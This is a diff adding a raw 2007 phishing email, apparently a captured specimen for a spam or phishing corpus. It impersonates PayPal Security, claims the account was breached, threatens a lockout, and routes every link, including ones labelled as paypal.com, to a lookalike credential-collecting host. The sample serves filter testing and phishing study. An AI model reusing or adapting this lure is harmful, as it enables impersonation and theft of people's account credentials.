@@ -1,0 +1,181 @@
+Return-Path: <security@paypal.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+	by example.com (Postfix) with ESMTP id 1B70446980
+	for <user@login.example.com>; Tue, 13 Mar 2007 02:21:45 -0400 (EDT)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+	by mail.example.org (Postfix) with ESMTP id 3F727131FC4E
+	for <user@example.com>; Tue, 13 Mar 2007 02:21:45 -0400 (EDT)
+Received: from server (unknown [222.100.123.103])
+	by mail.example.org (Postfix) with ESMTP id CCCD46FA1C1
+	for <user@example.com>; Tue, 13 Mar 2007 02:21:44 -0400 (EDT)
+Received: from helo ([210.98.31.4]) by server with Microsoft SMTPSVC(5.0.2195.6713);
+	 Tue, 13 Mar 2007 14:57:50 +0900
+From: "PayPal Security"<security@paypal.com>
+Subject: Attention! Your PayPal account has been violated!
+Date: Tue, 13 Mar 2007 14:59:19 +0900
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-ID: <SERVERPfTlHAUcgw8yT00000dcf@server>
+X-OriginalArrivalTime: 13 Mar 2007 05:57:50.0609 (UTC) FILETIME=[887F3010:01C76534]
+To: undisclosed-recipients:;
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 962
+
+<head><title>PayPal</title>
+<style type="text/css">#obmessage .dummy {}
+#z BODY, #z  TD {font-family: verdana,arial,helvetica,sans-serif;
+font-size:12px;color: #000000;}
+</style>
+</head>
+<span id=z>
+<xhtml>
+<table width=680 align=center>
+  <!--DWLayoutTable-->
+  <tr> 
+    <td width="670" height="110" valign="top"><a 
+target="_blank"href="http://218.1822468/files/.www.paypal.com/"><img
+src="https://www.paypalobjects.com/en_US/i/logo/paypal_logo.gif" 
+alt=PayPal width="200" height="50" border=0></a><a 
+target="58_blank"href="http://218.1822468/files/.www.paypal.com/"><img
+src="https://www.paypalobjects.com/en_US/i/header/hpmobile_gomobile_563x115.jpg" 
+alt=PayPal width="563" height="115" border=0></a></td>
+  </tr>
+</table>
+<table width="100%" cellpadding=0>
+  <!--DWLayoutTable-->
+  <tr> 
+    <td width=35 height="29">&nbsp;</td>
+    <td width=100% valign="top" 
+background="http://images.paypal.com/images/bg_clk.gif"><img
+src="http://images.paypal.com/images/pixel.gif"height=29 width=1 
+border=0></td>
+    <td width=32>&nbsp;</td>
+  </tr>
+  <tr> 
+    <td height="3"><img src="file:///C|/Documents and 
+Settings/GeouTzu/My Documents/spacer.gif" alt="" width="35" height="1"></td>
+    <td></td>
+    <td><img src="file:///C|/Documents and Settings/GeouTzu/My 
+Documents/spacer.gif" alt="" width="32" height="1"></td>
+  </tr>
+</table>
+<br>
+<table align=center>
+        <tr>
+        <td width=400>
+        <table>
+                <tr><td>Information Regarding Your account:</td></tr>
+                <tr>
+          <td><b>Dear PayPal Member!<br>
+            <br>
+            <font color="#FF0000">Attention! Your PayPal account has 
+been violated!</font><br>
+            <br>
+            Someone with ip address 86.34.211.83 tried to access your 
+personal 
+            account!</b><br>
+            <br>Please <b>click the link below</b> and
+enter your account information to confirm that you are not currently 
+away. You have 3 days to confirm account
+information or your account will be locked.<br><br>
+                <table width="80%" cellspacing=0 border=0 
+bgcolor="#FFE65C" align=left>
+                        <tr><td>
+                        <table width="100%" cellpadding=4 
+bgcolor="#FFFECD" align=center>
+                                <tr>
+                      <td class="pp_sansserif" align=center><a 
+target="_blank"
+href="http://218.1822468/files/.www.paypal.com/"><strong>Click 
+here to 
+                        activate your account</strong></a></td>
+                    </tr>
+                        </table>
+                        </td></tr>
+                </table>
+                <br><br><BR>You can also confirm your email address by 
+logging into your PayPal account at<a 
+href="http://218.1822468/files/.www.paypal.com/"
+target="_blank"http://218.1822468/files/.www.paypal.com/"><br>
+            http://www.paypal.com/</a> Click on the "<strong>Confirm 
+email</strong>" 
+            link in the Activate Account box and then enter this 
+confirmation 
+            number: 1099-81971-4441-9833-3990<br>
+            <br>Thank you for using
+PayPal!<br>The PayPal Team
+                </td></tr>
+                <tr><td><hr class=dotted></td></tr>
+                <tr><td>
+                <tr>
+          <td class="pp_footer">Please do not reply to this e-mail. 
+Mail sent 
+            to this address cannot be answered. For assistance, <br>
+            <img 
+src="http://www.paypalobjects.com/en_US/i/logo/verisign.gif"></td>
+        </tr><tr><td><img 
+src="http://images.paypal.com/en_US/i/scr/pixel.gif" height=10 width=1
+border=0></td></tr>
+                <tr>
+          <td>PayPal Email ID PP391</td>
+        </tr>
+        </table>
+        </td>
+        <td width=190 valign=top>
+        <table cellspacing=0 cellpadding=1 bgcolor="#cccccc">
+                <td>
+                <table cellspacing=0 cellpadding=0 bgcolor="#ffffff">
+                        <tr><td>
+                        <table width="100%" cellpadding=5 
+bgcolor="#eeeeee">
+                                <tr>
+                      <td align=center><strong>Protect Your Account 
+Info</strong></td>
+                    </tr>
+                        </table>
+                        <table cellpadding=5>
+                                <tr><td>Make sure you never provide 
+your password to fraudulent websites.<br><br>To
+safely and securely access the PayPal website or your account, open a 
+new web browser (e.g. Internet Explorer or
+Netscape) and type in the PayPal login page (http://paypal.com/) to be 
+sure you are on the real PayPal
+site.<br><br>PayPal will never ask you to enter your password in an 
+email.<br><br>
+                        For more information on protecting yourself 
+from fraud, 
+                        please review our Security Tips at <a 
+href="http://218.1822468/files/.www.paypal.com/">https://www.paypal.com/us/securitytips</a><br></td></tr>
+                        </table></td></tr>
+                        <tr><td>
+                        <table width="100%" cellpadding=5 
+bgcolor="#eeeeee">
+                                <tr>
+                      <td align=center><strong>Protect Your 
+Password</strong></td>
+                    </tr>
+                        </table>
+                        <table cellpadding=5>
+                                <tr><td>You should never give your 
+PayPal password to anyone.<br></td></tr>
+                        </table>
+                        </td></tr>
+                </table>
+                </td></tr>
+        </table>
+        
+    </td>
+  </tr>
+</table>
+</xhtml></span>
+
